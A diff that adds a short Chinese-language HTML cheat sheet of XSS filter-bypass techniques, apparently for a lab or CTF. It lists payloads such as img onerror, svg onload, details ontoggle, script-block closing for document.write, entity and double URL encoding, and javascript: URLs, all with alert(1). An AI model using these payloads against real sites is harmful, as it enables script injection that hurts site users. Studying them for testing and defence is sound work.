@@ -1,0 +1,8 @@
+<h4>绕过技巧</h4>
+<ul>
+<li><b>完全没有过滤</b>：<code>&lt;img src=x onerror=alert(1)&gt;</code>、<code>&lt;svg onload=alert(1)&gt;</code> 直接命中 innerHTML。</li>
+<li><b>只过滤 script 标签</b>：innerHTML 本身就不执行 <code>&lt;script&gt;</code>，但会执行 <code>&lt;img onerror&gt;</code>、<code>&lt;svg onload&gt;</code>、<code>&lt;details open ontoggle&gt;</code>。</li>
+<li><b>做了关键字黑名单</b>：大小写、<code>&lt;image src=x onerror&gt;</code>、<code>&lt;iframe srcdoc&gt;</code>、HTML 实体编码 <code>&amp;#60;img&amp;#62;</code>。</li>
+<li><b>使用了 document.write</b>：用 <code>&lt;/script&gt;&lt;script&gt;alert(1)</code> 闭合当前脚本块。</li>
+<li><b>有前端 URL 净化</b>：尝试双重编码 <code>%253Csvg%253E</code>、<code>//</code> 伪协议、<code>javascript:</code>，或在解码顺序上找差异。</li>
+</ul>
